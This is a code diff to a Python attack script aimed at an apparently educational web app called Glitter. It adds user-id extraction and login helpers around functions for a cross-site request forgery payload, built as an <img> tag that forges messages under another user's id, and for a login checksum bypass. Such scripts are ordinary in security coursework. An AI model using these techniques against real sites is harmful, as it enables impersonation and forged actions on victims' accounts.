@@ -286,6 +286,15 @@ def send_multiple_wows(glit_id, count):
 
 
 def xsrf_send_message_to_yourself_from_another_user(publisher_id):
+
+    global user_id, current_time
+    if current_time is None:
+        current_time = datetime.datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%S.000Z")
+    if user_id is None:
+        print("User ID not set. Please login first.")
+        return
+
+
     msg = (
         f'<img src="http://glitter.org.il/glit?id=-1&feed_owner_id={user_id}'
         f'&publisher_id={publisher_id}'
@@ -304,11 +313,18 @@ def xsrf_send_message_to_yourself_from_another_user(publisher_id):
 
 
 def login_website():
+    global sock
     path = "user"
     payload = '["' + username + '","' + password + '"]'
     response = send_and_receive_website(method="POST", path=path, data=payload, referer="login")
     if response.status_code == 200:
         extract_sparkle_cookie(response.text)
+        extract_user_id(response.text)
+        if user_id is None:
+            login_with_checksum_bypass(username, None)
+            if sock:
+                sock.close()
+                sock = None
     return response
 
 
@@ -319,6 +335,17 @@ def extract_sparkle_cookie(response_text):
         end = response_text.find('"', start)
         sparkle = response_text[start:end]
         cookie = {"sparkle": sparkle}
+
+
+def extract_user_id(response_text):
+    global user_id
+    if '"id":' in response_text:
+        start = response_text.find('"id":') + len('"id":')
+        end = response_text.find(',', start)
+        if end == -1:
+            end = response_text.find('}', start)
+        user_id = response_text[start:end].strip().strip('"')
+
 
 
 def get_password():
